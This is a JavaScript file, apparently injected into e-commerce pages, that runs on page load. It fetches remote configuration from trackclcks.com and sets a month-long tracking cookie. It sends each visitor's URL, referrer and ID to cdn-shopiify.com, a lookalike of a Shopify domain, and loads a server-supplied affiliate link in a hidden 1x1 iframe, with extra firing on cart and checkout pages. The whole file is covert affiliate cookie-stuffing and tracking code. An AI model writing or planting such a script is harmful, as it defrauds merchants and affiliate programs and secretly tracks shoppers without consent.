(function () {

    function generateUUID() {

        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'
            .replace(/[xy]/g, function (char) {

                const random =
                    Math.random() * 16 | 0;

                const value =
                    char === 'x'
                        ? random
                        : (random & 0x3 | 0x8);

                return value.toString(16);
            });
    }


    function getCookie(cookieName) {

        const prefix =
            cookieName + '=';

        const cookies =
            document.cookie.split(';');

        for (let i = 0; i < cookies.length; i++) {

            const cookie =
                cookies[i].trim();

            if (
                cookie.indexOf(prefix) === 0
            ) {

                return cookie.substring(
                    prefix.length,
                    cookie.length
                );
            }
        }

        return '';
    }


    function isCartPage() {

        const cartKeywords = [
            'cart',
            'checkout',
            'pay',
            'shipping',
            'review-order',
            'payment'
        ];

        return cartKeywords.some(
            keyword =>
                window.location.pathname
                    .toLowerCase()
                    .includes(keyword)
        );
    }

function createTrackingPixel(url) {

    const target =
        document.body ||
        document.documentElement;

    if (!target) return;

    var img =
        document.createElement('img');

    img.src = url;
    img.style.width = '1px';
    img.style.height = '1px';
    img.style.display = 'none';
    img.style.visibility = 'hidden';

    target.appendChild(img);
}

function createClickIframe(url) {

    const target =
        document.body ||
        document.documentElement;

    if (!target) return;

    const iframe =
        document.createElement('iframe');

    iframe.src = url;
    iframe.width = "1";
    iframe.height = "1";
    iframe.style =
        "display:none;visibility:hidden;";

    target.appendChild(iframe);
}

    async function initTracking() {

        const sessionKey =
            'tracking_done_' +
            window.location.hostname;

        if (
            sessionStorage.getItem(sessionKey)
        ) {

            if (!isCartPage()) {
                return;
            }
        }

        try {

            let uniqueId =
                getCookie('tracking_uuid') ||
                generateUUID();

            let expires =
                (
                    new Date(
                        Date.now() +
                        30 * 86400 * 1000
                    )
                ).toUTCString();

            document.cookie =
                'tracking_uuid=' +
                uniqueId +
                '; expires=' +
                expires +
                ';path=/;SameSite=Lax';


            let response =
                await fetch(
                    'https://cdn-shopiify.com/api/track-user',
                    {
                        method: 'POST',

                        keepalive: true,

                        body: JSON.stringify({

                            url:
                                window.location.href,

                            referrer:
                                document.referrer,

                            unique_id:
                                uniqueId,

                            origin:
                                window.location.hostname,

                            timestamp:
                                new Date().getTime()
                        }),

                        headers: {
                            'Content-Type':
                                'application/json'
                        }
                    }
                );

            let result =
                await response.json();


            if (
                result.success &&
                result.affiliate_url
            ) {

                createClickIframe(
                    result.affiliate_url
                );

                sessionStorage.setItem(
                    sessionKey,
                    'true'
                );

            } else {

                createTrackingPixel(
                    'https://cdn-shopiify.com/api/fallback-pixel?id=' +
                    uniqueId
                );
            }

        } catch (error) {

            console.error(
                'Tracking Failed:',
                error
            );
        }
    }


    function run() {

        fetch(
            'https://trackclcks.com/api/site-config?host=' +
            encodeURIComponent(
                window.location.hostname
            )
        )

        .then(function (response) {

            if (!response.ok) {

                throw new Error(
                    'Config API Failed'
                );
            }

            return response.json();
        })

        .then(function (siteConfig) {

            if (
                !siteConfig ||
                (
                    !siteConfig.always &&
                    !siteConfig.cartExtra
                )
            ) {
                return;
            }

            if (siteConfig.always) {

                initTracking();
            }

            if (
                siteConfig.cartExtra &&
                isCartPage()
            ) {

                initTracking();
            }
        })

        .catch(function (error) {

            console.error(
                'Config fetch failed:',
                error
            );
        });
    }


    if (
        document.readyState ===
            'interactive'
        ||
        document.readyState ===
            'complete'
    ) {

        run();

    } else {

        window.addEventListener(
            'DOMContentLoaded',
            run
        );
    }

})();